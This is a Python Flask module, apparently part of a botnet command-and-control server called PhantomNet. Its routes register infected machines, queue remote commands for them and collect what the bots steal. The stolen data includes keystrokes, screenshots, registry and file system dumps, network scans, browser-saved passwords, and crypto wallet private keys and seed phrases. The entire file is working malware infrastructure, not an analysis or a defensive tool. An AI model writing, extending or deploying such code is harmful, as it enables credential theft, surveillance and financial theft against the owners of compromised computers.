"""
Bot communication routes for PhantomNet C2 Server
"""

import json
import secrets
from datetime import datetime

from flask import Blueprint, request, jsonify

from ..models import (
    db, Bot, Command, SystemInfo, NetworkScan, ProcessList, FileSystem,
    RegistryData, Screenshot, KeyloggerData, ChromiumCredentials, CryptoWallet
)
from ..server import PhantomC2Server

bot_bp = Blueprint('bot', __name__)

# Global server instance (would be injected in production)
server = PhantomC2Server()

@bot_bp.route('/bot/register', methods=['POST'])
def bot_register():
    """Bot registration endpoint"""
    data = request.json
    if not data:
        return jsonify({'error': 'Invalid data'}), 400

    # Generate bot ID
    bot_id = secrets.token_urlsafe(16)

    # Create new bot
    bot = Bot(
        id=bot_id,
        ip_address=request.remote_addr,
        hostname=data.get('hostname', 'unknown'),
        os_info=data.get('os_info', 'unknown'),
        username=data.get('username', 'unknown'),
        capabilities=json.dumps(data.get('capabilities', {})),
        session_token=secrets.token_urlsafe(32)
    )

    db.session.add(bot)
    db.session.commit()

    # Store system info
    system_info = SystemInfo(
        bot_id=bot_id,
        system_data=json.dumps(data.get('system_info', {}))
    )
    db.session.add(system_info)
    db.session.commit()

    return jsonify({
        'bot_id': bot_id,
        'session_token': bot.session_token,
        'server_time': datetime.utcnow().isoformat()
    })

@bot_bp.route('/bot/command/<bot_id>', methods=['GET'])
def get_command(bot_id):
    """Get pending command for bot"""
    session_token = request.headers.get('X-Session-Token')
    if not session_token:
        return jsonify({'error': 'Missing session token'}), 401

    # Verify session token
    bot = Bot.query.filter_by(id=bot_id, session_token=session_token).first()
    if not bot:
        return jsonify({'error': 'Invalid session token'}), 401

    # Update last seen
    bot.last_seen = datetime.utcnow()
    db.session.commit()

    # Get pending command
    command = Command.query.filter_by(bot_id=bot_id, status='pending').first()
    if command:
        command.status = 'running'
        db.session.commit()

        return jsonify({
            'id': command.id,
            'command': command.command,
            'args': json.loads(command.args) if command.args else {}
        })

    return jsonify({'status': 'no_command'})

@bot_bp.route('/bot/result/<command_id>', methods=['POST'])
def submit_result(command_id):
    """Submit command result from bot"""
    session_token = request.headers.get('X-Session-Token')
    if not session_token:
        return jsonify({'error': 'Missing session token'}), 401

    data = request.json
    if not data:
        return jsonify({'error': 'Invalid data'}), 400

    # Find command
    command = Command.query.get(command_id)
    if not command:
        return jsonify({'error': 'Command not found'}), 404

    # Verify session token
    bot = Bot.query.filter_by(id=command.bot_id, session_token=session_token).first()
    if not bot:
        return jsonify({'error': 'Invalid session token'}), 401

    # Update command
    command.status = 'completed'
    command.result = json.dumps(data.get('result', {}))
    db.session.commit()

    return jsonify({'status': 'success'})

@bot_bp.route('/bot/data/system_info', methods=['POST'])
def submit_system_info():
    """Submit system information from bot"""
    session_token = request.headers.get('X-Session-Token')
    if not session_token:
        return jsonify({'error': 'Missing session token'}), 401

    data = request.json
    if not data or 'bot_id' not in data or 'system_info' not in data:
        return jsonify({'error': 'Invalid data'}), 400

    # Verify session token
    bot = Bot.query.filter_by(id=data['bot_id'], session_token=session_token).first()
    if not bot:
        return jsonify({'error': 'Invalid session token'}), 401

    # Store system info
    system_info = SystemInfo(
        bot_id=data['bot_id'],
        system_data=json.dumps(data['system_info'])
    )
    db.session.add(system_info)
    db.session.commit()

    return jsonify({'status': 'success'})

@bot_bp.route('/bot/data/network_scan', methods=['POST'])
def submit_network_scan():
    """Submit network scan data from bot"""
    session_token = request.headers.get('X-Session-Token')
    if not session_token:
        return jsonify({'error': 'Missing session token'}), 401

    data = request.json
    if not data or 'bot_id' not in data or 'scan_data' not in data:
        return jsonify({'error': 'Invalid data'}), 400

    # Verify session token
    bot = Bot.query.filter_by(id=data['bot_id'], session_token=session_token).first()
    if not bot:
        return jsonify({'error': 'Invalid session token'}), 401

    # Store network scan
    network_scan = NetworkScan(
        bot_id=data['bot_id'],
        scan_data=json.dumps(data['scan_data'])
    )
    db.session.add(network_scan)
    db.session.commit()

    return jsonify({'status': 'success'})

@bot_bp.route('/bot/data/process_list', methods=['POST'])
def submit_process_list():
    """Submit process list from bot"""
    session_token = request.headers.get('X-Session-Token')
    if not session_token:
        return jsonify({'error': 'Missing session token'}), 401

    data = request.json
    if not data or 'bot_id' not in data or 'process_data' not in data:
        return jsonify({'error': 'Invalid data'}), 400

    # Verify session token
    bot = Bot.query.filter_by(id=data['bot_id'], session_token=session_token).first()
    if not bot:
        return jsonify({'error': 'Invalid session token'}), 401

    # Store process list
    process_list = ProcessList(
        bot_id=data['bot_id'],
        process_data=json.dumps(data['process_data'])
    )
    db.session.add(process_list)
    db.session.commit()

    return jsonify({'status': 'success'})

@bot_bp.route('/bot/data/file_system', methods=['POST'])
def submit_file_system():
    """Submit file system data from bot"""
    session_token = request.headers.get('X-Session-Token')
    if not session_token:
        return jsonify({'error': 'Missing session token'}), 401

    data = request.json
    if not data or 'bot_id' not in data or 'file_data' not in data:
        return jsonify({'error': 'Invalid data'}), 400

    # Verify session token
    bot = Bot.query.filter_by(id=data['bot_id'], session_token=session_token).first()
    if not bot:
        return jsonify({'error': 'Invalid session token'}), 401

    # Store file system data
    file_system = FileSystem(
        bot_id=data['bot_id'],
        path=data.get('path', ''),
        file_data=json.dumps(data['file_data'])
    )
    db.session.add(file_system)
    db.session.commit()

    return jsonify({'status': 'success'})

@bot_bp.route('/bot/data/registry', methods=['POST'])
def submit_registry():
    """Submit registry data from bot"""
    session_token = request.headers.get('X-Session-Token')
    if not session_token:
        return jsonify({'error': 'Missing session token'}), 401

    data = request.json
    if not data or 'bot_id' not in data or 'registry_data' not in data:
        return jsonify({'error': 'Invalid data'}), 400

    # Verify session token
    bot = Bot.query.filter_by(id=data['bot_id'], session_token=session_token).first()
    if not bot:
        return jsonify({'error': 'Invalid session token'}), 401

    # Store registry data
    registry_data = RegistryData(
        bot_id=data['bot_id'],
        registry_data=json.dumps(data['registry_data'])
    )
    db.session.add(registry_data)
    db.session.commit()

    return jsonify({'status': 'success'})

@bot_bp.route('/bot/data/screenshot', methods=['POST'])
def submit_screenshot():
    """Submit screenshot from bot"""
    session_token = request.headers.get('X-Session-Token')
    if not session_token:
        return jsonify({'error': 'Missing session token'}), 401

    data = request.json
    if not data or 'bot_id' not in data or 'screenshot_data' not in data:
        return jsonify({'error': 'Invalid data'}), 400

    # Verify session token
    bot = Bot.query.filter_by(id=data['bot_id'], session_token=session_token).first()
    if not bot:
        return jsonify({'error': 'Invalid session token'}), 401

    # Store screenshot
    screenshot = Screenshot(
        bot_id=data['bot_id'],
        screenshot_data=data['screenshot_data']
    )
    db.session.add(screenshot)
    db.session.commit()

    return jsonify({'status': 'success'})

@bot_bp.route('/bot/data/keylogger', methods=['POST'])
def submit_keylogger():
    """Submit keylogger data from bot"""
    session_token = request.headers.get('X-Session-Token')
    if not session_token:
        return jsonify({'error': 'Missing session token'}), 401

    data = request.json
    if not data or 'bot_id' not in data or 'keystroke_data' not in data:
        return jsonify({'error': 'Invalid data'}), 400

    # Verify session token
    bot = Bot.query.filter_by(id=data['bot_id'], session_token=session_token).first()
    if not bot:
        return jsonify({'error': 'Invalid session token'}), 401

    # Store keylogger data
    keylogger_data = KeyloggerData(
        bot_id=data['bot_id'],
        keystroke_data=json.dumps(data['keystroke_data'])
    )
    db.session.add(keylogger_data)
    db.session.commit()

    return jsonify({'status': 'success'})

@bot_bp.route('/bot/data/chromium', methods=['POST'])
def submit_chromium_credentials():
    """Submit Chromium credentials from bot"""
    session_token = request.headers.get('X-Session-Token')
    if not session_token:
        return jsonify({'error': 'Missing session token'}), 401

    data = request.json
    if not data or 'bot_id' not in data or 'credentials' not in data:
        return jsonify({'error': 'Invalid data'}), 400

    # Verify session token
    bot = Bot.query.filter_by(id=data['bot_id'], session_token=session_token).first()
    if not bot:
        return jsonify({'error': 'Invalid session token'}), 401

    # Store Chromium credentials
    for cred in data['credentials']:
        chromium_cred = ChromiumCredentials(
            bot_id=data['bot_id'],
            url=cred.get('url', ''),
            username=cred.get('username', ''),
            password=cred.get('password', ''),
            browser=cred.get('browser', 'unknown')
        )
        db.session.add(chromium_cred)

    db.session.commit()
    return jsonify({'status': 'success'})

@bot_bp.route('/bot/data/crypto_wallets', methods=['POST'])
def submit_crypto_wallets():
    """Submit cryptocurrency wallets from bot"""
    session_token = request.headers.get('X-Session-Token')
    if not session_token:
        return jsonify({'error': 'Missing session token'}), 401

    data = request.json
    if not data or 'bot_id' not in data or 'wallets' not in data:
        return jsonify({'error': 'Invalid data'}), 400

    # Verify session token
    bot = Bot.query.filter_by(id=data['bot_id'], session_token=session_token).first()
    if not bot:
        return jsonify({'error': 'Invalid session token'}), 401

    # Store cryptocurrency wallets
    for wallet in data['wallets']:
        crypto_wallet = CryptoWallet(
            bot_id=data['bot_id'],
            wallet_name=wallet.get('name', 'unknown'),
            wallet_path=wallet.get('path', ''),
            wallet_data=json.dumps(wallet.get('data', {})),
            private_key=wallet.get('private_key', ''),
            mnemonic_phrase=wallet.get('mnemonic_phrase', '')
        )
        db.session.add(crypto_wallet)

    db.session.commit()
    return jsonify({'status': 'success'})
